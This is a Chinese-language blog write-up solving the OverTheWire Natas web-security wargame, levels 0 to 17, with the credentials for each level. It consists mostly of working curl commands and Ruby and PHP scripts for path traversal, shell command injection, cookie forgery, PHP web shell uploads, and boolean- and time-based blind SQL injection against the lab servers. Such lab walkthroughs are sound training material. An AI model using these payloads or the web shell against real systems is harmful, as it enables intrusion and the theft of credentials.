---
layout: post
title: OverTheWire - Natas Wargame - Level 0 ~ Level 17
author: MaskRay
tags: [security, wargame]
---

[Natas Wargame](http://www.overthewire.org/wargames/natas/)是關於web安全的wargame。

<!-- more -->

### Level 0

```bash
curl -su natas0:natas0 http://natas0.natas.labs.overthewire.org | grep password
```

### Level 1

`body`標籤使用了`oncontextmenu`屏蔽右鍵菜單，但是可以不理會繼續使用`curl`：

```bash
curl -su natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto http://natas1.natas.labs.overthewire.org
```

### Level 2

```bash
curl -su natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi http://natas2.natas.labs.overthewire.org
```

看到源代碼中有文件`/files/pixel.png`，因此訪問目錄`/files/`：

```bash
curl -su natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi http://natas2.natas.labs.overthewire.org/files/
```

發現文件`users.txt`，訪問得到`natas3`的密碼。

### Level 3

```bash
curl -su natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/robots.txt
```

發現目錄`/s3cr3t/`，因此訪問該目錄：

```bash
curl -su natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/s3cr3t/
curl -su natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
```

### Level 4

提示：`Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"`，
因此用`-e`選項設置`Referer:`：

```bash
curl -su natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ http://natas4.natas.labs.overthewire.org/ -e http://natas5.natas.labs.overthewire.org/
```

### Level 5

```bash
curl -isu natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq http://natas5.natas.labs.overthewire.org
```

發現`Set-Cookie: loggedin=0`，嘗試用`-b`指定cookie：

```bash
curl -su natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq http://natas5.natas.labs.overthewire.org -b 'loggedin=1'
```

### Level 6

訪問`/index-source.html`發現可疑文件`includes/secret.inc`，訪問之得到`"FOEIUWGHFEEUHOFUOIU"`。

```bash
curl -su natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 -F 'secret=FOEIUWGHFEEUHOFUOIU' -F 'submit=1' http://natas6.natas.labs.overthewire.org
```

### Level 7

可以對`index.php`實施directory traversal attack：

```bash
curl -su natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 http://natas7.natas.labs.overthewire.org/\?page\=/etc/natas_webpass/natas8
```

### Level 8

`$encodedSecret`是下面函數編碼得到的：

```php
function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}
```

使用

```bash
echo 3d3d516343746d4d6d6c315669563362 | xxd -p -r | rev | base64 -d
```

解碼得到密碼，然後：

```bash
curl -su natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe -F secret=oubWYf2kBq -F submit=1 http://natas8.natas.labs.overthewire.org
```

### Level 9

```bash
curl -su natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl -F 'needle=;cat /etc/natas_webpass/natas10 #' -F submit=1 http://natas9.natas.labs.overthewire.org
```

### Level 10

和上一關類似，但對`needle`的值做了過濾，不允許出現`;|&`三種字符。

```bash
curl -su natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu -F 'needle=. /etc/natas_webpass/natas11 #' -F submit=1 http://natas10.natas.labs.overthewire.org
```

### Level 11

```bash
curl -Isu natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK http://natas11.natas.labs.overthewire.org
```

得到cookie：`Set-Cookie: data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D`。

根據`/index-source.html`：`cookie[data] xor key = tempdata`，所以`cookie[data] xor tempdata = key`。
編寫如下PHP程序運行得到`key`：`qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq`。

```php
<?php
$outText = base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw');
$key = json_encode(array("showpassword"=>"no", "bgcolor"=>"#ffffff"));
$in = '';
for ($i=0; $i < strlen($outText); $i++) {
	$in .= $outText[$i] ^ $key[$i % strlen($key)];
}
echo $in;
?>
```

然後對代碼做調整：

```php
<?php
$outText = '';
$in = json_encode(array("showpassword"=>"yes", "bgcolor"=>"#ffffff"));
$key = 'qw8J';
for ($i=0; $i < strlen($in); $i++) {
	$outText .= $in[$i] ^ $key[$i % strlen($key)];
}
echo base64_encode($outText);
?>
```

執行得到cookie，在`curl`裏用`-b`設置這個cookie：

```bash
curl -su natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK -b data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK http://natas11.natas.labs.overthewire.org
```

### Level 12

```bash
curl -isu natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 -F filename=a.php -F 'uploadedfile=@-;filename=a.php' http://natas12.natas.labs.overthewire.org <<< '<?php passthru($_GET['cmd']); ?>'
```

上傳一個簡單的web shell，然後執行

```bash
curl -isu natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 'http://natas12.natas.labs.overthewire.org/upload/vvrbw84pu0.php?cmd=cat+/etc/natas_webpass/natas13'
```

讀取密碼。

### Level 13

和上一關的差別是多使用了`exif_imagetype`檢測上傳文件的類型：

```php
else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name']))
```

```bash
curl -su natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY -F filename=a.php -F 'uploadedfile=@-;filename=a.php' http://natas13.natas.labs.overthewire.org <<< $'\xff\xd8\xff<?php passthru($_GET['cmd']); ?>' | grep uploaded
curl -su natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY 'http://natas13.natas.labs.overthewire.org/upload/8xr6u3ow6k.php?cmd=cat+/etc/natas_webpass/natas14'
```

### Level 14

代碼中有：

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```

，存在SQL injection漏洞：

```bash
curl -su natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 -F 'username=" or 1#' http://natas14.natas.labs.overthewire.org
```

### Level 15

代碼中有：

```php
if(mysql_num_rows($res) > 0)
```

從服務端返回的HTML裏是否有`user exists`可以知道注入的SQL語句返回的記錄行數是否爲空。可以二分搜索密碼的每一位，
一般密碼字符的ASCII碼在33到126之間，可以用下界32表示密碼結束。

```ruby
require 'net/http'
Net::HTTP.start('natas15.natas.labs.overthewire.org') {|http|
  1.upto(1992) {|pos|
    l = 32
    h = 126
    while l < h
      m = (l + h) / 2
      req = Net::HTTP::Post.new('/')
      req.basic_auth 'natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
      req.body = %{username=natas16" and #{m} < ascii(mid(password,#{pos},1)) #}
      res = http.request(req)
      if res.body =~ /user exists/
        l = m + 1
      else
        h = m
      end
    end
    break if l == 32
    print l.chr
  }
}
```

### Level 16

Level 11的升級版，現在過濾``;|&`'"``這幾種字符了。

```bash
curl -o/dev/null -su natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh -F 'needle=$(cat /etc/natas_webpass/natas17 > /tmp/natas17)' http://natas16.natas.labs.overthewire.org
```

Level 9允許執行shell命令：

```bash
curl -su natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl -F 'needle=;cat /tmp/natas17 #' -F submit=1 http://natas9.natas.labs.overthewire.org
```

### Level 17

代碼和Level 15類似，但這次服務端不再提供注入的SQL返回的結果是否非空的信息了。
可以採用time-based SQL injection的方法：

```bash
curl -su natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw -F 'username=natas18" and if(ascii(mid(password,1,1)) < 128,sleep(1),1) #' http://natas17.natas.labs.overthewire.org
```

用`if`語句讓服務器MySQL對`ascii(mid(password,1,1)) < 128`求值，
若爲真則`sleep`一秒，通過檢測收到服務端返回結果的用時來得知表達式是否爲真。
改變128得到二分搜索密碼每個字符的代碼。因爲time-based注入方式執行時間較長，
考慮用多線程提速：

```ruby
require 'net/http'
timeout = 2
ans = '*' * 32
worker = ->from, to {
  Net::HTTP.start('natas17.natas.labs.overthewire.org') {|http|
    http.read_timeout = timeout
    (from...to).each {|pos|
      l = 32
      h = 126
      while l < h
        m = (l + h) / 2
        req = Net::HTTP::Post.new('/')
        req.basic_auth 'natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
        req.body = %{username=natas18" and if(#{m} < ascii(mid(password,#{pos+1},1)), sleep(#{timeout}), 1) #}
        begin
          http.request(req)
        rescue Net::ReadTimeout
          l = m + 1
        else
          h = m
        end
      end
      ans[pos] = l.chr
    }
  }
}
16.times.map {|i| Thread.new { worker[i*2, i*2+2] } }.each &:join
puts ans
```

得到密碼：`xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP`。

## 其他wargames資源

- [http://smashthestack.org/wargames]()
- [http://ipwned.it/challenge.php]()
- [http://exploit-exercises.com/]()
- [http://www.hellboundhackers.org/]()
- [http://hax.tor.hu/]()
